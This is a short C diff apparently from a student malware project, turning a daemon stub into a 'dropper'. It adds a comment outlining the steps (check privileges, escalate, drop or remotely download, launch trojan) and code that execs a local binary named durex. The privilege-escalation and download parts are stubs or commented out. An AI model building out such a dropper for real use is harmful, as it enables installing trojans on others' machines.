@@ -1,4 +1,4 @@
-#include "durex.h"
+#include "dropper.h"
 
 void    privilege_escalation(void)
 {
@@ -13,22 +13,8 @@ bool    permission_check()
     // int gid = getgid();
 
     if (uid != 0)
-    {
-        privilege_escalation();
         return (false);
-    }
     return(true);
-}
-
-void get_path(char *ptr)
-{
-    char *pid;
-
-    ft_strcat(ptr, "/proc/");
-    pid = ft_itoa(getpid());
-    ft_strcat(ptr, pid);
-    free(pid);
-    ft_strcat(ptr, "/fd/");
 }
 
 /// pack the program inside the client ?
@@ -38,33 +24,33 @@ void get_path(char *ptr)
 // https://manpages.debian.org/testing/systemd/daemon.7.en.html
 int     main(void)
 {
+    /*
+      STEPS -> Dropper :
+      1 - check priv
+      2 - privesc
+      3 - drop local or remote downlaod
+      4 - launch trojan
+    */
+
     // check if suid 0
     //  if (!permission_check())
     //  privesc();
     //  return (-1);
 
-    // check if it's already runnin on the system
+    // if (get_remote_daemon() == false)
+    //    get_local_daemon();
 
-    //    get_daemon();
-    create_daemon_old_style();
+    // run dropped binary
+    char *arg[] = {NULL};
 
-    // debug
-    syslog (LOG_NOTICE, "Daemon started");
-    // persistance
-
-    closelog();
-    // evasion
-
-    // remote access : open ports and listen on 4242
-
-    int i = 0;
-    while (true)
+    if (execv("./durex", arg) == -1)
     {
-        if (i == 6)
-            break ;
-        sleep(10);
-        i++;
+        ft_putendl("exec failed");
+        return (-1);
     }
-    syslog (LOG_NOTICE, "Daemon stoped");
+
+    //if (execv(BINARY_PATH, arg) == -1)
+    //   return (-1);
+
     return (0);
 }
